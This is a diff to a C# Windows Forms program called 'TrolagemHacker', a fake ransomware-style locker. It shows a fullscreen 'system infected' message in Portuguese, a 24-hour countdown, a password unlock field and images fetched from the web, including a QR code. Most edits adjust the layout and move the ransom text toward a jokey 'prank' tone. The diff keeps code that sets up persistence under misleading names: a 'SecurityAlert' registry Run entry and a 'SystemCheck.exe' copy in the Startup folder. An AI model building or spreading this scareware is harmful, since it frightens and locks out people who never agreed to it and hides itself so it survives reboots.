@@ -65,13 +65,14 @@ public class TrolagemHacker : Form
         int screenWidth = Screen.PrimaryScreen.Bounds.Width;
         int screenHeight = Screen.PrimaryScreen.Bounds.Height;
 
+        // --- CRONÔMETRO ---
         tempoFinal = DateTime.Now.AddHours(24);
         lblCronometro = new Label();
         lblCronometro.ForeColor = Color.Lime;
         lblCronometro.Font = new Font("Courier New", 30, FontStyle.Bold);
         lblCronometro.Size = new Size(screenWidth, 60);
         lblCronometro.TextAlign = ContentAlignment.MiddleCenter;
-        lblCronometro.Location = new Point(0, screenHeight - 150);
+        lblCronometro.Location = new Point(0, screenHeight - 120);
         this.Controls.Add(lblCronometro);
 
         timerRelogio = new System.Windows.Forms.Timer();
@@ -82,31 +83,38 @@ public class TrolagemHacker : Form
         };
         timerRelogio.Start();
 
+        // --- TÍTULO ---
         Label lblTitulo = new Label();
-        lblTitulo.Text = "SISTEMA COMPROMETIDO";
+        lblTitulo.Text = "ERRO FATAL: SISTEMA INFECTADO PELO VÍRUS 'CURIOSO_V1.0'";
         lblTitulo.ForeColor = Color.Red;
-        lblTitulo.Font = new Font("Courier New", 36, FontStyle.Bold);
-        lblTitulo.AutoSize = true;
-        lblTitulo.Location = new Point((screenWidth - 600) / 2, 320);
+        lblTitulo.Font = new Font("Courier New", 24, FontStyle.Bold);
+        lblTitulo.TextAlign = ContentAlignment.MiddleCenter;
+        lblTitulo.Size = new Size(screenWidth, 100);
+        lblTitulo.Location = new Point(0, 300);
         this.Controls.Add(lblTitulo);
 
+        // --- TEXTO OPÇÃO 3 ---
         Label lblTexto = new Label();
-        lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
-                        "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
-                        "SISTEMA SILENCIOSO ATIVADO.";
+        lblTexto.Text = "Parece que alguem andou clicando onde nao devia, hein? O Windows detectou um nivel critico de 'curiosidade excessiva' e decidiu tirar ferias por 24 horas.\n\n" +
+                        "STATUS DO SISTEMA:\n" +
+                        "- Barra de tarefas: SEQÜESTRADA\n" +
+                        "- Area de trabalho: DELETADA (BRINCADEIRINHA... OU NAO)\n" +
+                        "- Gerenciador de tarefas: EM GREVE\n\n" +
+                        "Se voce quiser ver sua area de trabalho de novo hoje, vai ter que adivinhar a senha secreta. Dica: Voce nunca vai acertar kkkkkk. Digite a chave abaixo se tiver coragem!";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
-        lblTexto.Size = new Size(800, 100);
-        lblTexto.Location = new Point((screenWidth - 800) / 2, 400);
+        lblTexto.Size = new Size(900, 250);
+        lblTexto.Location = new Point((screenWidth - 900) / 2, 400);
         this.Controls.Add(lblTexto);
 
+        // --- CAMPO SENHA ---
         txtChave = new TextBox();
         txtChave.PasswordChar = '*';
         txtChave.Font = new Font("Arial", 20);
         txtChave.TextAlign = HorizontalAlignment.Center;
         txtChave.Size = new Size(250, 40);
-        txtChave.Location = new Point((screenWidth - 250) / 2, 680);
+        txtChave.Location = new Point((screenWidth - 250) / 2, 660);
         this.Controls.Add(txtChave);
 
         btnDesbloquear = new Button();
@@ -115,10 +123,11 @@ public class TrolagemHacker : Form
         btnDesbloquear.FlatStyle = FlatStyle.Flat;
         btnDesbloquear.Font = new Font("Arial", 12, FontStyle.Bold);
         btnDesbloquear.Size = new Size(250, 50);
-        btnDesbloquear.Location = new Point((screenWidth - 250) / 2, 730);
+        btnDesbloquear.Location = new Point((screenWidth - 250) / 2, 710);
         btnDesbloquear.Click += (s, e) => VerificarChave();
         this.Controls.Add(btnDesbloquear);
 
+        // --- IMAGENS ---
         using (WebClient client = new WebClient()) {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             try {
@@ -126,8 +135,8 @@ public class TrolagemHacker : Form
                 PictureBox pbHacker = new PictureBox();
                 using (var ms = new MemoryStream(imgData)) { pbHacker.Image = Image.FromStream(ms); }
                 pbHacker.SizeMode = PictureBoxSizeMode.Zoom;
-                pbHacker.Size = new Size(250, 250);
-                pbHacker.Location = new Point((screenWidth - 250) / 2, 50);
+                pbHacker.Size = new Size(220, 220);
+                pbHacker.Location = new Point((screenWidth - 220) / 2, 50);
                 this.Controls.Add(pbHacker);
             } catch {}
             try {
@@ -135,17 +144,17 @@ public class TrolagemHacker : Form
                 PictureBox pbQR = new PictureBox();
                 using (var ms = new MemoryStream(qrData)) { pbQR.Image = Image.FromStream(ms); }
                 pbQR.SizeMode = PictureBoxSizeMode.Zoom;
-                pbQR.Size = new Size(150, 150);
-                pbQR.Location = new Point((screenWidth - 150) / 2, 510);
+                pbQR.Size = new Size(130, 130);
+                pbQR.Location = new Point((screenWidth - 130) / 2, 520);
                 this.Controls.Add(pbQR);
             } catch {}
         }
 
+        // --- PERSISTÊNCIA ---
         try {
             string exePath = Application.ExecutablePath;
             RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
             rk.SetValue("SecurityAlert", exePath);
-            
             string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
             if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
         } catch {}
